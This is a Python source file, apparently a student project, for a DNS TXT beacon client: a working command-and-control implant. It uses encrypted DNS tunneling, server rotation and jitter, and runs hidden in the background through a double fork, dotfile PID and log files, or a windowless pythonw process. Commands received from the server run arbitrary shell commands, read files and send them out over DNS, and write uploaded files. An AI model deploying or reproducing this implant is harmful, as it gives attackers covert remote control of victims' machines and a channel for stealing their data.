#Author: Lukasz Ozimek
#Email: lno5555@rit.edu

#!/usr/bin/env python3
"""
DNS TXT Beacon Client - Universal Cross-Platform with Persistence
Supports rotating/fallback server IPs, jitter, reconnection, and AES-256-GCM encryption
"""

import socket
import sys
import base64
import time
import datetime
import os
import struct
import subprocess
import platform
import random
import hashlib
import hmac

# ============================================================
# SERVER CONFIGURATION
# ============================================================

# List of servers to try, in priority order.
# Client rotates through these if one goes down.
SERVER_LIST = [
    {"ip": "192.168.1.31", "port": 53},   # Primary
    {"ip": "192.168.1.32", "port": 53},   # Fallback 1
    {"ip": "10.10.10.5",   "port": 53},   # Fallback 2
    # Add more as needed:
    # {"ip": "x.x.x.x", "port": 5353},
]
# Beacon timing
BEACON_INTERVAL  = 5    # Seconds between beacons
JITTER_PERCENT   = 20   # ±% randomness added to interval (0 to disable)
MAX_FAILURES     = 3    # Failures before rotating to next server
RETRY_SLEEP      = 10   # Seconds to wait after trying all servers

# ============================================================
# ENCRYPTION
# Generate a new one with: python3 -c "import secrets; print(secrets.token_hex(32))"
# ============================================================
SHARED_KEY = "CHANGEME_use_python3_secrets_token_hex_32_here_000000000000000000"

# ============================================================

IS_WINDOWS = platform.system() == 'Windows'

# Try to import pycryptodome for AES
try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    AES_AVAILABLE = True
except ImportError:
    AES_AVAILABLE = False

# Runtime state
_current_server_index = 0
_failure_count        = 0


# ============================================================
# Encryption helpers
# ============================================================

def _derive_key(shared_key: str) -> bytes:
    """Derive a 32-byte AES key from the shared key string"""
    return hashlib.sha256(shared_key.encode()).digest()


def encrypt_message(plaintext: str) -> str:
    """
    Encrypt plaintext using AES-256-GCM.
    Returns base64-encoded: nonce(16) + tag(16) + ciphertext
    Falls back to plain base64 if pycryptodome not installed.
    """
    if not AES_AVAILABLE:
        # Fallback: plain base64 (no encryption)
        return base64.b64encode(plaintext.encode()).decode()

    key   = _derive_key(SHARED_KEY)
    nonce = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext.encode())
    payload = nonce + tag + ciphertext
    return base64.b64encode(payload).decode()


def decrypt_message(encoded: str) -> str:
    """
    Decrypt a message encrypted by encrypt_message.
    Returns plaintext string, or None on failure.
    Falls back to plain base64 decode if pycryptodome not installed.
    """
    if not AES_AVAILABLE:
        try:
            return base64.b64decode(encoded.encode()).decode()
        except Exception:
            return encoded  # Not encrypted, return as-is
    try:
        payload    = base64.b64decode(encoded.encode())
        nonce      = payload[:16]
        tag        = payload[16:32]
        ciphertext = payload[32:]
        key        = _derive_key(SHARED_KEY)
        cipher     = AES.new(key, AES.MODE_GCM, nonce=nonce)
        plaintext  = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext.decode()
    except Exception:
        return None  # Decryption or authentication failed



def get_jittered_interval():
    """Return beacon interval with random jitter applied"""
    if JITTER_PERCENT == 0:
        return BEACON_INTERVAL
    jitter = BEACON_INTERVAL * (JITTER_PERCENT / 100)
    return BEACON_INTERVAL + random.uniform(-jitter, jitter)


def current_server():
    """Return the currently active server dict"""
    return SERVER_LIST[_current_server_index]


def rotate_server(reason=""):
    """Rotate to the next server in the list"""
    global _current_server_index, _failure_count

    old = current_server()
    _current_server_index = (_current_server_index + 1) % len(SERVER_LIST)
    _failure_count = 0
    new = current_server()

    msg = f"Rotating server: {old['ip']} → {new['ip']}"
    if reason:
        msg += f" ({reason})"
    return msg


def record_failure():
    """Record a beacon failure, rotate server if threshold hit"""
    global _failure_count
    _failure_count += 1
    if _failure_count >= MAX_FAILURES:
        return rotate_server(f"failed {_failure_count} times")
    return None


def encode_data_to_subdomain(data):
    """Encode data as base64 and split into DNS-safe subdomain labels"""
    encoded = base64.b64encode(data.encode()).decode()
    encoded = encoded.replace('+', '-').replace('/', '_').replace('=', '')
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    return '.'.join(chunks) + '.beacon.example.local'


def build_dns_query(query_id, domain):
    """Build a DNS TXT query packet manually"""
    header = struct.pack('!HHHHHH', query_id, 0x0100, 1, 0, 0, 0)
    question = b''
    for label in domain.split('.'):
        question += bytes([len(label)]) + label.encode()
    question += b'\x00'
    question += struct.pack('!HH', 16, 1)
    return header + question

def parse_dns_response(data):
    """Parse DNS response and extract TXT record"""
    try:
        pos = 12
        while data[pos] != 0:
            pos += data[pos] + 1
        pos += 5

        if data[pos] & 0xC0 == 0xC0:
            pos += 2
        else:
            while data[pos] != 0:
                pos += data[pos] + 1
            pos += 1

        rtype = struct.unpack('!H', data[pos:pos+2])[0]
        pos += 8  # skip type, class, ttl
        pos += 2  # skip rdlength

        if rtype == 16:
            txt_len = data[pos]
            return data[pos+1:pos+1+txt_len].decode()
    except Exception:
        pass
    return None


def send_dns_query(domain, timeout=5):
    """Send DNS query to current server, return response or None"""
    srv = current_server()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        query_id = int(time.time()) & 0xFFFF
        query = build_dns_query(query_id, domain)
        sock.sendto(query, (srv['ip'], srv['port']))
        data, _ = sock.recvfrom(4096)
        sock.close()
        return parse_dns_response(data)
    except socket.timeout:
        return None
    except Exception:
        return None


def send_beacon(client_id):
    """Send an encrypted beacon to the current server"""
    plaintext = f"BEACON {client_id}"
    encrypted = encrypt_message(plaintext)
    domain    = encode_data_to_subdomain(encrypted)
    raw       = send_dns_query(domain)
    if raw is None:
        return None
    # Server response is also encrypted — decrypt it
    plaintext_resp = decrypt_message(raw)
    if plaintext_resp is None:
        return None   # Bad MAC = tampered / wrong key
    return plaintext_resp


def send_result(client_id, result, max_retries=3):
    """
    Send encrypted result to server. Truncates if too large for DNS,
    and retries up to max_retries times on failure.
    """
    # DNS domain name max is 253 chars total.
    # AES-GCM adds 32 bytes overhead, base64 expands by ~4/3.
    # Cap at 150 bytes to stay well within limits.
    MAX_RESULT_BYTES = 150
    encoded_result = result.encode()
    if len(encoded_result) > MAX_RESULT_BYTES:
        result = encoded_result[:MAX_RESULT_BYTES].decode(errors='replace') + " [TRUNCATED]"

    plaintext = f"RESULT {client_id} {result}"
    encrypted = encrypt_message(plaintext)
    domain    = encode_data_to_subdomain(encrypted)

    for attempt in range(max_retries):
        raw = send_dns_query(domain, timeout=8)  # longer timeout for result sends
        if raw is not None:
            return decrypt_message(raw)
        time.sleep(1)

    return None


def execute_command(command_str):
    """Execute a command and return the result - Windows compatible"""
    parts = command_str.split(maxsplit=1)
    command = parts[0].upper()
    args = parts[1] if len(parts) > 1 else ""

    if command == "PING":
        return "PONG"

    elif command == "ECHO":
        return args if args else "[empty]"

    elif command == "TIME":
        return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    elif command == "UPTIME":
        if IS_WINDOWS:
            try:
                result = subprocess.run(
                    ["powershell", "-Command", "(Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime"],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                return result.stdout.strip()
            except:
                return "Uptime unavailable"
        else:
            try:
                with open('/proc/uptime', 'r') as f:
                    uptime_seconds = float(f.readline().split()[0])
                    hours = int(uptime_seconds // 3600)
                    minutes = int((uptime_seconds % 3600) // 60)
                    return f"{hours}h {minutes}m"
            except:
                return "Uptime unavailable"

    elif command == "WHOAMI":
        if IS_WINDOWS:
            return os.getenv('USERNAME', 'unknown')
        else:
            return os.getenv('USER', 'unknown')

    elif command == "PWD":
        return os.getcwd()

    elif command == "HOSTNAME":
        return socket.gethostname()

    elif command == "EXIT":
        return "EXITING"

    elif command == "REVERSE":
        return args[::-1] if args else "[empty]"

    elif command == "UPPER":
        return args.upper() if args else "[empty]"

    elif command == "LOWER":
        return args.lower() if args else "[empty]"

    elif command == "LEN":
        return str(len(args))

    elif command == "CALC":
        try:
            result = eval(args, {"__builtins__": {}}, {})
            return str(result)
        except Exception as e:
            return f"Error: {str(e)}"

    elif command == "SHELL":
        if not args:
            return "Usage: SHELL <command>"
        try:
            if IS_WINDOWS:
                # Use cmd.exe on Windows
                result = subprocess.run(
                    args,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
            else:
                result = subprocess.run(
                    args,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
            output = result.stdout + result.stderr
            return output.strip() if output else f"[exit code: {result.returncode}]"
        except subprocess.TimeoutExpired:
            return "Error: Command timed out (30s limit)"
        except Exception as e:
            return f"Error: {str(e)}"

    elif command == "CD":
        if not args:
            return "Usage: CD <directory>"
        try:
            os.chdir(args)
            return f"Changed to: {os.getcwd()}"
        except Exception as e:
            return f"Error: {str(e)}"

    elif command == "LS" or command == "DIR":
        path = args if args else "."
        try:
            if IS_WINDOWS:
                result = subprocess.run(
                    ["cmd", "/c", "dir", path],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
            else:
                result = subprocess.run(
                    ["ls", "-la", path],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
            return result.stdout.strip()
        except Exception as e:
            return f"Error: {str(e)}"

    elif command == "CAT" or command == "TYPE":
        if not args:
            return "Usage: CAT <filename>"
        try:
            with open(args, 'r') as f:
                content = f.read(10000)
                return content if content else "[empty file]"
        except Exception as e:
            return f"Error: {str(e)}"

    elif command == "DOWNLOAD":
        if not args:
            return "Usage: DOWNLOAD <filename>"
        try:
            with open(args, 'rb') as f:
                data = f.read(50000)
                encoded = base64.b64encode(data).decode()
                return f"FILE:{encoded}"
        except Exception as e:
            return f"Error: {str(e)}"

    elif command == "UPLOAD":
        parts = args.split(maxsplit=1)
        if len(parts) < 2:
            return "Usage: UPLOAD <filename> <base64data>"
        filename, encoded_data = parts
        try:
            data = base64.b64decode(encoded_data)
            with open(filename, 'wb') as f:
                f.write(data)
            return f"Uploaded {len(data)} bytes to {filename}"
        except Exception as e:
            return f"Error: {str(e)}"

    elif command == "SYSINFO":
        # Windows-specific system info
        info = []
        info.append(f"OS: {platform.system()} {platform.release()}")
        info.append(f"Architecture: {platform.machine()}")
        info.append(f"Hostname: {socket.gethostname()}")
        info.append(f"User: {os.getenv('USERNAME' if IS_WINDOWS else 'USER', 'unknown')}")
        info.append(f"Python: {platform.python_version()}")
        return "\n".join(info)

    else:
        return f"Unknown command: {command}. Use HELP for available commands."


def daemonize_windows(client_id):
    """Windows-specific background process"""
    import subprocess

    # Use pythonw.exe to run without console window
    pythonw = sys.executable.replace('python.exe', 'pythonw.exe')
    if not os.path.exists(pythonw):
        pythonw = 'pythonw.exe'

    # Launch detached process
    subprocess.Popen(
        [pythonw, __file__, client_id, 'background'],
        creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP,
        close_fds=True
    )

    print(f"✓ Background beacon started: {client_id}")
    print(f"  Check Task Manager for python process")


def beacon_loop(client_id, beacon_interval, debug=False, daemon=False):
    """Main beacon loop - cross-platform with server rotation and jitter"""

    if daemon and not IS_WINDOWS:
        # ── First fork: create intermediate child ──────────────
        try:
            pid = os.fork()
        except OSError as e:
            print(f"✗ Fork #1 failed: {e}")
            sys.exit(1)

        if pid > 0:
            # ── Original parent: write PID and exit cleanly ───
            pid_file = f"/tmp/.beacon_{client_id}.pid"
            with open(pid_file, 'w') as f:
                f.write(str(pid))
            print(f"✓ Daemon started with PID {pid}")
            print(f"  PID file: {pid_file}")
            print(f"  Stop with: kill {pid}")
            os._exit(0)   # os._exit avoids triggering atexit / finally blocks

        # ── Intermediate child: become session leader ─────────
        os.setsid()

        # Redirect stdout/stderr to log file before second fork
        log_file = f"/tmp/.beacon_{client_id}.log"
        log_fd = open(log_file, 'a')
        sys.stdout = log_fd
        sys.stderr = log_fd

        # ── Second fork: detach from terminal completely ──────
        try:
            pid2 = os.fork()
        except OSError as e:
            sys.exit(1)

        if pid2 > 0:
            os._exit(0)   # Intermediate child exits — grandchild continues

        # ── Grandchild: this is the actual daemon process ─────
        os.chdir('/')     # Prevent holding a mount point open
        # (execution continues into the beacon loop below)

    if not daemon:
        print("="*60)
        print(f"DNS Beacon Client: {client_id}")
        print("="*60)
        print(f"Platform: {platform.system()} {platform.release()}")
        print(f"Servers ({len(SERVER_LIST)}):")
        for i, s in enumerate(SERVER_LIST):
            marker = "→" if i == _current_server_index else " "
            print(f"  {marker} [{i+1}] {s['ip']}:{s['port']}")
        print(f"Beacon interval: {beacon_interval}s ±{JITTER_PERCENT}% jitter")
        print(f"Rotate after: {MAX_FAILURES} failures")
        if AES_AVAILABLE:
            key_preview = SHARED_KEY[:8] + "..." + SHARED_KEY[-4:]
            print(f"Encryption: AES-256-GCM ✓  (key: {key_preview})")
        else:
            print("Encryption: DISABLED (pip install pycryptodome)")
        if debug:
            print("Debug mode: ON")
        print("Press Ctrl+C to stop\n")

    beacon_count      = 0
    all_servers_tried = 0
    _pending_result   = [None]  # [0] = (client_id, result) tuple if retry needed

    while True:
        try:
            beacon_count += 1
            ts  = datetime.datetime.now().strftime("%H:%M:%S")
            srv = current_server()

            # Retry a pending result before sending next beacon
            if _pending_result[0] is not None:
                pid, pres = _pending_result[0]
                if not daemon and not debug:
                    print(f"[{ts}] Retrying pending result...")
                sent = send_result(pid, pres)
                if sent is not None:
                    _pending_result[0] = None
                    if not daemon and not debug:
                        print("   ✓ Pending result delivered")
                else:
                    if not daemon and not debug:
                        print("   ✗ Retry failed, will try again next beacon")
                time.sleep(get_jittered_interval())
                continue

            if debug:
                print(f"[{ts}] #{beacon_count} → {srv['ip']}:{srv['port']}")
            elif not daemon:
                print(f"[{ts}] #{beacon_count} [{srv['ip']}] → ", end='', flush=True)

            response = send_beacon(client_id)

            if response:
                all_servers_tried = 0

                if response == "NOP":
                    if not daemon and not debug:
                        print("✓")

                elif response.startswith("CMD:"):
                    command = response[4:]
                    if not daemon and not debug:
                        print(f"📥 {command}")

                    result = execute_command(command)

                    if not daemon and not debug:
                        print(f"   → {result[:80]}")

                    if result == "EXITING":
                        if not daemon:
                            print("\n✓ Exit received. Stopping.")
                        break

                    sent = send_result(client_id, result)
                    if not daemon and not debug:
                        if sent is not None:
                            print("   ✓ Result sent")
                        else:
                            print("   ✗ Result send failed (will retry next beacon)")
                            # Queue the result to retry on next beacon
                            _pending_result[0] = (client_id, result)
                else:
                    if not daemon:
                        print(f"? {response}")

            else:
                # Failure - maybe rotate
                rotate_msg = record_failure()
                if rotate_msg:
                    all_servers_tried += 1
                    if not daemon:
                        print(f"✗ → {rotate_msg}")
                    if all_servers_tried >= len(SERVER_LIST):
                        if not daemon:
                            print(f"  All servers down. Sleeping {RETRY_SLEEP}s...")
                        time.sleep(RETRY_SLEEP)
                        all_servers_tried = 0
                else:
                    if not daemon and not debug:
                        print(f"✗ ({_failure_count}/{MAX_FAILURES})")

            time.sleep(get_jittered_interval())

        except KeyboardInterrupt:
            if not daemon:
                print("\n\n✓ Stopped")
            break
        except Exception as e:
            if debug or daemon:
                print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Error: {e}")
            time.sleep(beacon_interval)


if __name__ == "__main__":
    if len(sys.argv) < 2 or sys.argv[1] in ['-h', '--help', 'help']:
        print("DNS Beacon Client - Universal (Windows/Linux/macOS)")
        print("\nConfigure servers at top of file:")
        print("  SERVER_LIST = [")
        print('    {"ip": "192.168.1.31", "port": 53},  # Primary')
        print('    {"ip": "192.168.1.32", "port": 53},  # Fallback')
        print("  ]")
        print("\nUsage:")
        print("  python beacon_client_win.py <agent_name> [interval]")
        print("  python beacon_client_win.py <agent_name> daemon      (Linux)")
        print("  python beacon_client_win.py <agent_name> background  (Windows)")
        print("  python beacon_client_win.py <agent_name> debug")
        print("\nExamples:")
        print("  python beacon_client_win.py web-server-01")
        print("  python beacon_client_win.py db-backup 10 daemon")
        print("  python beacon_client_win.py workstation background")
        print()
        sys.exit(0)

    client_id = sys.argv[1]
    flags = [a.lower() for a in sys.argv[2:]]

    daemon = False
    if 'background' in flags:
        if IS_WINDOWS:
            if sys.argv[-1].lower() != 'background':
                daemonize_windows(client_id)
                sys.exit(0)
            else:
                daemon = True
        else:
            daemon = True
    elif 'daemon' in flags:
        daemon = True

    debug = 'debug' in flags

    if daemon and debug:
        print("✗ Cannot combine daemon and debug modes")
        sys.exit(1)

    interval = BEACON_INTERVAL
    for arg in sys.argv[2:]:
        if arg.lower() not in ['debug', 'daemon', 'background']:
            try:
                interval = int(arg)
            except ValueError:
                pass

    beacon_loop(client_id, interval, debug=debug, daemon=daemon)
